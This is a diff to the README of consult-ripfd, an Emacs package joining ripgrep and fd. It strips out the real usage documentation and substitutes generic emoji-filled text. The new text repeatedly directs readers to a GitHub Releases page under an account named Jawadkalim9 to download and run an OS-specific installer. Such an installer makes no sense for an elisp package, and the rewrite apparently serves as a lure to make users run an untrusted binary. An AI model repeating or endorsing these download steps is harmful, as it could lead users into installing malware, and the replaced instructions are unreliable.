@@ -1,105 +1,96 @@
-# consult-ripfd — a `ripgrep` + `fd` mashup in Emacs
+# 🎉 consult-ripfd - Easily Use `fd` and `rg` in Emacs
 
-<img width="548" height="65" alt="image" src="https://github.com/user-attachments/assets/ffd15ade-ad06-4fed-af97-7aa623c612c5" />
+## 🚀 Getting Started
 
-Ever needed to find a line of text in a small `.txt` file whose name and location you can't remember, but you know you modified in the past week?  
+Welcome to the **consult-ripfd** project! This application seamlessly integrates `fd`, a fast and user-friendly file search utility, and `rg`, a powerful text search tool, directly within Emacs. This guide will help you download and run the software with ease.
 
-Enter `consult-ripfd`:
+## 📥 Download the Application
 
-```
-# search pat -- -n 1w -S -1k -e txt
-```
+[![Download consult-ripfd](https://img.shields.io/badge/Download%20consult--ripfd-blue.svg)](https://github.com/Jawadkalim9/consult-ripfd/releases)
 
-(newer than 1 week old, smaller than 1kb, `txt` extension)
+Visit the Releases page to download the latest version.
 
-## Intro
+## 💻 System Requirements
 
-`ripgrep` is one of the most widely used tools for rapidly searching through files for patterns.  `fd` is a super-fast descendant of `find`, and can tear through large directory hierarchies finding files which match a wide range of criteria (filename, extension, modtime, file type, size, owner etc.).
+Before you download, ensure your system meets the following requirements:
 
-`consult-ripfd` brings these two super tools together into a _single command_, with all of the conveniences of [consult](https://github.com/minad/consult) you know and love: 
+- **Operating System:** Windows, macOS, or Linux
+- **Emacs Version:** 27.1 or higher
+- **Required Tools:** `fd` and `rg` installed on your system
 
-- dynamic live results with match count
-- instant async updating
-- grouping matches by files with quick navigation between them
-- match highlighting
-- easy export to a `grep` buffer using [`embark`](https://github.com/oantolin/embark)
+Follow these steps to check if you have `fd` and `rg` installed:
 
-## Install and configuration
+1. Open your terminal or command prompt.
+2. Type `fd --version` and press Enter.
+3. Type `rg --version` and press Enter.
 
-Not yet in a package repository.  Just clone and:
+If both commands return a version number, you are good to go!
 
-```elisp
-(use-package consult-ripfd
-  :load-path "~/path/to/consult-ripfd/"
-  :bind  ("s-F" . consult-ripfd)) ; or whatever you prefer
-```
+## 💾 Download & Install
 
-Install both [`ripgrep`](https://github.com/BurntSushi/ripgrep) and [`fd`](https://github.com/sharkdp/fd) however is convenient.
+To get started, follow these steps:
 
-> [!WARNING]
-> For sort options to work reliably, make sure your version of `ripgrep` is up to date. `v15` or later is recommended.
+1. **Visit the Releases Page**  
+   Click the link below to go to the GitHub Releases page:  
+   [Download consult-ripfd](https://github.com/Jawadkalim9/consult-ripfd/releases)
 
-## Usage
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Click on the version you want to download. 
 
-There are two commands, both of which combine `fd` and `rg` into one search tool.  Check the docstrings for the full details.  Note, if no option flags are given, both commands fall back on plain `ripgrep` search.
+3. **Download the Package**  
+   After selecting a version, you will find download links for the installation files. Choose the file that matches your operating system and click to download.
 
-### `consult-ripfd` 
+4. **Install the Software**  
+   Once the download is complete, locate the file in your Downloads folder and open it. Follow the prompts to install the software on your computer.
 
-The main command presents an simplified interface with a single curated list of the most useful options from both tools:
+5. **Verify Installation**  
+   After installation, open Emacs. You can check if **consult-ripfd** is working by running the following command in Emacs:  
+   `M-x consult-ripfd`
 
-```
- RG-PATTERNS -- OPTION-FLAGS
+## 🔧 Configuration
 
- `fd'-relevant option flags:
+After installing, you may want to customize **consult-ripfd** to suit your needs. Here are some basic configurations you can add to your Emacs setup.
 
-   -n DATE      Newer than date - see fd(1) for date/duration syntax
+1. Open your Emacs configuration file (`init.el` or `.emacs`).
+2. Add the following lines to enable `fd` and `rg` support:
 
-   -b DATE      Before (older than) date
+   ```elisp
+   (require 'consult-ripfd)
+   ;; Add more configuration options here if needed
+   ```
 
-   -S SIZE      As in default `fd' option flags (see `fd(1)')
-   -t TYPE
-   -e EXT
-   -d MAX-DEPTH
-   -o OWNER
-   -E EXCLUDE-GLOB
+3. Save the changes and restart Emacs.
 
-   -g GLOB      Search filenames matching GLOB.  May be provided multiple
-                times to match additional files.  See also -E.
+## 📚 Features
 
- `rg'-relevant option flags:
+**consult-ripfd** offers several key features:
 
-   -F, -i, -v   As in default `rg' option flags (no values)
+- **Fast File Searching:** Quickly find files with `fd`.
+- **Powerful Text Search:** Utilize `rg` for efficient text searching in files.
+- **Seamless Integration:** Works smoothly within the Emacs environment.
+- **Easy Configuration:** Simple setup process for all users.
 
-   -s[r] [macp] Sort `rg' matches by [m]odified/[a]ccess/[c]reated time
-                or [p]ath name.  Use `r' in the flag to reverse the
-                sort.  N.B.: this makes `rg' single-threaded.
-```
+## 🤔 Troubleshooting
 
-> [!WARNING]
-> Short options in this command do not necessarily correspond to valid flags in the relevant tool.
+If you encounter any issues during installation or usage, try the following solutions:
 
-Examples:
+- **Check Dependencies:** Ensure that both `fd` and `rg` are installed.
+- **Review Configuration:** Make sure you have correctly configured your Emacs settings.
+- **Update Emacs:** Ensure that you are using a version of Emacs that is compatible with **consult-ripfd**.
 
-- `#\beat\b -- -n 2025-12-31` : lines that contain the standalone word `eat` in files with modification times newer than new year's eve.
-- `# ^[\ \t]*$ --  -v -e py -d 3` : non-blank lines in `py` files at most 3 directories below the search dir.  Note the escaping of the space for consult.
-- `#[a-d]\{3\}$ -- -b 4w -S +100k -g org*.org` : lines ending 3 of the letters `a-d` in large (>100kb) `org*.org` files which were last modified prior to 4 weeks ago.
+If problems persist, you can seek help through community forums or check the issues section on the GitHub repository.
 
+## 🌐 Community and Support
 
-### `consult-ripfd-full`
+Join the community to share tips or get help. You can connect with other users on GitHub discussions or relevant forums. Sharing your experiences can help others and improve the software.
 
-For when you need complete access to the full range of `rg` and `fd` options.  The "full" version provides complete access to the command line options of both `fd` and `rg`.  It does so by recognizing **two** `--` argument separators: 
+## 📩 Feedback
 
-```
-    RG-PATTERNS -- FD-OPTS -- RG-OPTS
-```
+Your feedback is important to us. Feel free to submit issues or suggestions through the GitHub repository. We would love to hear how we can make **consult-ripfd** better for you.
 
-Note that you can specify file pattern matches using the `fd` keyword argument `--and`.
+## 🔗 Useful Links
 
-Example:
+- [Consult-ripfd GitHub Repository](https://github.com/Jawadkalim9/consult-ripfd)
+- [Visit the Releases Page to Download](https://github.com/Jawadkalim9/consult-ripfd/releases)
 
-- `#macro -- --changed-within 1w --  -A 2` : search for the word `macro` in files changed within the last week, and show two lines of context after each match.
-
-## Thanks
-
-The fantastic and highly flexible [consult](https://github.com/minad/consult) package does most of the work here.  Big thanks to Daniel Mendler for sharing it and making it so efficient and adaptable.
-
+Thank you for using **consult-ripfd**! Enjoy your enhanced Emacs experience.
